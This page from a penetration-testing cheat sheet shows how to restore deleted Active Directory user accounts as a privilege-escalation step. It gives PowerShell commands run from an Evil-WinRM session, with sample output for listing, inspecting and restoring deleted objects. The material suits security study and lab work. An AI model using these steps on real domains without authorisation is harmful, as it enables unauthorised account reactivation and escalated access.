---
title: "AD Recycle Bin"
date: 2024-7-13
tags: ["Domain Controller", "AD Recycle Bin", "Active Directory", "Windows", "Deleted Objects", "Restore"]
---

### Privesc #1: Restore Deleted AD Object

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import AD Module

```console
Import-Module activedirectory
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> import-module activedirectory
```

#### 2. Query All Deleted Objects within Domain

```console
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

Deleted           : True
DistinguishedName : CN=Another User\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=example,DC=com
Name              : Another User
                    DEL:ebe15df5-e265-45ec-b7fc-359877217138
ObjectClass       : user
ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138
```

#### 3. Get All Details for the Deleted Object

```console
Get-ADObject -filter { SAMAccountName -eq '<DELETED_USER>' } -includeDeletedObjects -property *
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Get-ADObject -filter { SAMAccountName -eq 'another.user' }
-includeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : example.com/Deleted Objects/Another User
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
CN                              : Another User
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
---[SNIP]---
```

#### 4. Restore the Deleted Object

```console
# Rename the target account to avoid user exists error
Restore-ADObject -Identity <OBJECT_GUID> -NewName '<DELETED_USER>.2' -TargetPath 'CN=Users,DC=<EXAMPLE>,DC=<COM>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Restore-ADObject -Identity ebe15df5-e265-45ec-b7fc-359877217138 -NewName 'Another User2' -TargetPath 'CN=Users,DC=EXAMPLE,DC=COM'
```

```console
# Or
Restore-ADObject -Identity "<DISTINGUISHED_NAME>"
```

```console
PS C:\programdata> Restore-ADObject -Identity "CN=Apple Seed\0ADEL:1c6---[SNIP]---9db,CN=Deleted Objects,DC=example,DC=com"
Restore-ADObject -Identity "CN=Apple Seed\0ADEL:1c6---[SNIP]---9db,CN=Deleted Objects,DC=example,DC=com"
```

#### 5. Check

```console
net user <DELETED_USER>
```

{{< /tabcontent >}}
